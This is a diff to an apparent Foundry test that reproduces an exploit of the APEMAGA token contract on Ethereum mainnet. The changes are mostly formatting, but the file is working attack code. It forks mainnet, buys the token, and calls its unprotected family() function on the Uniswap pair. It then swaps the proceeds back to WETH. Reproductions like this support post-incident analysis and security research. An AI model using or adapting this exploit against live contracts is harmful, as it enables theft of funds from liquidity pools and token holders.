@@ -11,20 +11,22 @@ import "./../interface.sol";
 // Vulnerable Contract : https://etherscan.io/address/0x56ff4afd909aa66a1530fe69bf94c74e6d44500c
 // GUY : https://x.com/ChainAegis/status/1806297556852601282
 
-interface APEMAGA  is IERC20{
-    function family(address account) external;
+interface APEMAGA is IERC20 {
+    function family(
+        address account
+    ) external;
 }
 
 contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x85705829c2f71EE3c40A7C28f6903e7c797c9433); 
+    Uni_Pair_V2 Pair = Uni_Pair_V2(0x85705829c2f71EE3c40A7C28f6903e7c797c9433);
     IUniswapV2Router uniswapv2 = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     APEMAGA Apemaga = APEMAGA(0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
     function setUp() external {
-        cheats.createSelectFork("mainnet", 20175261);
+        cheats.createSelectFork("mainnet", 20_175_261);
         deal(address(WETH), address(this), 9 ether);
     }
 
@@ -35,8 +37,7 @@ contract ContractTest is Test {
     }
 
     function attack() public {
-      
-        swap_token_to_ExactToken(0.1 ether,address(WETH),address(Apemaga),8000 ether);
+        swap_token_to_ExactToken(0.1 ether, address(WETH), address(Apemaga), 8000 ether);
         // emit log_named_decimal_uint("[End] Attacker token before exploit", Apemaga.balanceOf(address(this)), Apemaga.decimals());
 
         Apemaga.family(address(Pair));
@@ -48,19 +49,17 @@ contract ContractTest is Test {
         address[] memory addrPath = new address[](2);
         addrPath[0] = address(Apemaga);
         addrPath[1] = address(WETH);
-        Apemaga.approve(address(uniswapv2),99999999 ether);
-        uniswapv2.swapExactTokensForTokens(Apemaga.balanceOf(address(this)), 0, addrPath, address(this), type(uint256).max);
-
-
+        Apemaga.approve(address(uniswapv2), 99_999_999 ether);
+        uniswapv2.swapExactTokensForTokens(
+            Apemaga.balanceOf(address(this)), 0, addrPath, address(this), type(uint256).max
+        );
     }
- 
 
-    function swap_token_to_ExactToken(uint256 amount,address a,address b,uint256 amountInMax) payable public {
+    function swap_token_to_ExactToken(uint256 amount, address a, address b, uint256 amountInMax) public payable {
         IERC20(a).approve(address(uniswapv2), amountInMax);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
         uniswapv2.swapExactETHForTokens{value: amount}(0, path, address(this), block.timestamp + 120);
-
     }
 }
